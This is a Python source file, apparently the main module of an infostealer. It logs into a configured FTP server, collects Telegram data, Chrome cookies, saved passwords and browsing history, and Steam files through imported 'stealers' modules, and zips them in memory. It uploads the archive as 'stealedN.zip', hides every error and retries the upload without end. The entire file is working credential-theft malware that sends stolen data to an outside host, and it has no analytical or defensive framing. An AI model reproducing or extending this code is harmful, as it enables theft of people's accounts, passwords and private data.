import stealers
import config
from os import path
from ftplib import FTP
import traceback
import io
from zipfile import ZipFile


def main():
	# FTP module to connect server
	ftp = FTP()
	ftp.set_debuglevel(config.LOG_LEVEL)
	ftp.connect(config.ADDRESS_HOST, config.ADDRESS_PORT)
	ftp.login(config.LOGIN, config.PASSWORD)
	ftp.cwd(config.FOLDER)

	archive_bytes = io.BytesIO()

	archive = ZipFile(archive_bytes, "w")

	try:
		telegram = stealers.telegram.steal()
		with archive.open("telegram.zip", "w") as f:
			f.write(telegram.read())
	except:
		pass

	try:
		chrome_cookies = stealers.chrome.cookies.steal()
		with archive.open("chrome.cookies.sqlite", "w") as f:
			f.write(chrome_cookies.read())
	except:
		pass

	try:
		chrome_passwords = stealers.chrome.passwords.steal()
		with archive.open("chrome.passwords.sqlite", "w") as f:
			f.write(chrome_passwords.read())
	except:
		pass

	try:
		chrome_history = stealers.chrome.history.steal()
		with archive.open("chrome.history.sqlite", "w") as f:
			f.write(chrome_history.read())
	except:
		pass

	try:
		steam = stealers.steam.steal()
		with archive.open("steam.zip", "w") as f:
			f.write(steam.read())
	except:
		pass

	archive.close()

	archive_bytes.seek(0)

	files = ftp.nlst()

	c = 1

	while f'stealed{c}.zip' in files:
		c += 1

	while True:
		try:
			ftp.storbinary(f"STOR {path.basename(f'stealed{c}.zip')}", archive_bytes, config.BUFFER_SIZE)
			break
		except:
			pass
if __name__ == "__main__":
	main()